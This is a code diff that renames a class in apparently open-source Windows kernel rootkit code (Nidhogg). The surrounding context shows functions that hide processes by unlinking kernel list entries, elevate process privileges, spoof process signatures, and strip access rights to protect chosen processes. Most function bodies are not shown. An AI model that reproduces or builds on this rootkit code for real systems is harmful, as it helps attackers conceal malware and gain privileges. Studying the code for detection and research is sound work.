@@ -1,8 +1,8 @@
 #include "pch.h"
-#include "ProcessUtils.h"
+#include "ProcessHandler.h"
 
 _IRQL_requires_max_(APC_LEVEL)
-ProcessUtils::ProcessUtils() {
+ProcessHandler::ProcessHandler() {
 	this->protectedProcesses.Count = 0;
 	InitializeListHead(this->protectedProcesses.Items);
 	this->protectedProcesses.Lock.Init();
@@ -12,7 +12,7 @@ ProcessUtils::ProcessUtils() {
 	this->hiddenProcesses.Lock.Init();
 }
 
-ProcessUtils::~ProcessUtils() {
+ProcessHandler::~ProcessHandler() {
 	ClearProcessList(ProcessType::Protected);
 	ClearProcessList(ProcessType::Hidden);
 }
@@ -38,7 +38,7 @@ OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPE
 	ULONG pid = HandleToULong(PsGetProcessId(Process));
 
 	// If the process was found on the list, remove permissions for dump / write process memory and kill the process.
-	if (NidhoggProccessUtils->FindProcess(pid, ProcessType::Protected)) {
+	if (NidhoggProcessHandler->FindProcess(pid, ProcessType::Protected)) {
 		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_OPERATION;
 		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_READ;
 		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_CREATE_THREAD;
@@ -60,7 +60,7 @@ OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPE
 * @status [NTSTATUS]	 -- Whether successfully hidden or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-NTSTATUS ProcessUtils::HideProcess(_In_ ULONG pid) {
+NTSTATUS ProcessHandler::HideProcess(_In_ ULONG pid) {
 	PEPROCESS targetProcess;
 	HiddenProcessEntry entry = { 0 };
 	NTSTATUS status = STATUS_SUCCESS;
@@ -112,7 +112,7 @@ NTSTATUS ProcessUtils::HideProcess(_In_ ULONG pid) {
 * @status [NTSTATUS] -- Whether successfully hidden or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-NTSTATUS ProcessUtils::UnhideProcess(_In_ ULONG pid) {
+NTSTATUS ProcessHandler::UnhideProcess(_In_ ULONG pid) {
 	PEPROCESS targetProcess;
 	NTSTATUS status = STATUS_SUCCESS;
 	HiddenProcessEntry* entryToRestore = nullptr;
@@ -166,7 +166,7 @@ NTSTATUS ProcessUtils::UnhideProcess(_In_ ULONG pid) {
 * @status [NTSTATUS] -- Whether successfully elevated or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-NTSTATUS ProcessUtils::ElevateProcess(_In_ ULONG pid) {
+NTSTATUS ProcessHandler::ElevateProcess(_In_ ULONG pid) {
 	PEPROCESS privilegedProcess;
 	PEPROCESS targetProcess;
 	NTSTATUS status = STATUS_SUCCESS;
@@ -207,7 +207,7 @@ NTSTATUS ProcessUtils::ElevateProcess(_In_ ULONG pid) {
 * @status  			[NTSTATUS] 			-- Whether the operation was successful or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-NTSTATUS ProcessUtils::SetProcessSignature(_In_ ProcessSignature* ProcessSignature) {
+NTSTATUS ProcessHandler::SetProcessSignature(_In_ ProcessSignature* ProcessSignature) {
 	PEPROCESS process;
 	NTSTATUS status = STATUS_SUCCESS;
 
@@ -242,7 +242,7 @@ NTSTATUS ProcessUtils::SetProcessSignature(_In_ ProcessSignature* ProcessSignatu
 * @bool						 -- Whether found or not.
 */
 _IRQL_requires_max_(DISPATCH_LEVEL)
-bool ProcessUtils::FindProcess(_In_ ULONG pid, _In_ ProcessType type) const {
+bool ProcessHandler::FindProcess(_In_ ULONG pid, _In_ ProcessType type) const {
 	if (!IsValidPid(pid))
 		return false;
 
@@ -283,7 +283,7 @@ bool ProcessUtils::FindProcess(_In_ ULONG pid, _In_ ProcessType type) const {
 * @bool				-- Whether successfully added or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-bool ProcessUtils::AddProtectedProcess(_In_ ULONG pid) {
+bool ProcessHandler::AddProtectedProcess(_In_ ULONG pid) {
 	if (!IsValidPid(pid))
 		return false;
 
@@ -307,7 +307,7 @@ bool ProcessUtils::AddProtectedProcess(_In_ ULONG pid) {
 * @bool				-- Whether successfully added or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-bool ProcessUtils::AddHiddenProcess(_In_ HiddenProcessEntry hiddenProcess) {
+bool ProcessHandler::AddHiddenProcess(_In_ HiddenProcessEntry hiddenProcess) {
 	if (!IsValidPid(hiddenProcess.Pid) || !hiddenProcess.OriginalEntry)
 		return false;
 
@@ -332,7 +332,7 @@ bool ProcessUtils::AddHiddenProcess(_In_ HiddenProcessEntry hiddenProcess) {
 * @bool						 -- Whether successfully removed or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-bool ProcessUtils::RemoveProcess(_In_ ULONG pid, _In_ ProcessType type) {
+bool ProcessHandler::RemoveProcess(_In_ ULONG pid, _In_ ProcessType type) {
 	ProtectedProcessEntry entry = { 0 };
 
 	if (!IsValidPid(pid))
@@ -370,7 +370,7 @@ bool ProcessUtils::RemoveProcess(_In_ ULONG pid, _In_ ProcessType type) {
 * There is no return value.
 */
 _IRQL_requires_max_(APC_LEVEL)
-void ProcessUtils::ClearProcessList(_In_ ProcessType type) {
+void ProcessHandler::ClearProcessList(_In_ ProcessType type) {
 	switch (type) {
 	case ProcessType::Protected:
 		ClearList<ProcessList, ProtectedProcessEntry>(this->protectedProcesses);
@@ -394,7 +394,7 @@ void ProcessUtils::ClearProcessList(_In_ ProcessType type) {
 * @bool										-- Whether the operation was successful or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-bool ProcessUtils::ListProtectedProcesses(_Inout_ IoctlProcessList* processList) {
+bool ProcessHandler::ListProtectedProcesses(_Inout_ IoctlProcessList* processList) {
 	PLIST_ENTRY currentEntry = nullptr;
 	SIZE_T count = 0;
 	NTSTATUS status = STATUS_SUCCESS;
@@ -447,7 +447,7 @@ bool ProcessUtils::ListProtectedProcesses(_Inout_ IoctlProcessList* processList)
 * @bool										-- Whether the operation was successful or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-bool ProcessUtils::ListHiddenProcesses(_Inout_ IoctlProcessList* processList) {
+bool ProcessHandler::ListHiddenProcesses(_Inout_ IoctlProcessList* processList) {
 	PLIST_ENTRY currentEntry = nullptr;
 	SIZE_T count = 0;
 	NTSTATUS status = STATUS_SUCCESS;
@@ -500,7 +500,7 @@ bool ProcessUtils::ListHiddenProcesses(_Inout_ IoctlProcessList* processList) {
 * Returns:
 * There is no return value.
 */
-void ProcessUtils::RemoveListLinks(PLIST_ENTRY current) {
+void ProcessHandler::RemoveListLinks(PLIST_ENTRY current) {
 	PLIST_ENTRY previous;
 	PLIST_ENTRY next;
 
@@ -525,7 +525,7 @@ void ProcessUtils::RemoveListLinks(PLIST_ENTRY current) {
 * Returns:
 * There is no return value.
 */
-void ProcessUtils::AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target) {
+void ProcessHandler::AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target) {
 	PLIST_ENTRY next;
 
 	next = target->Flink;
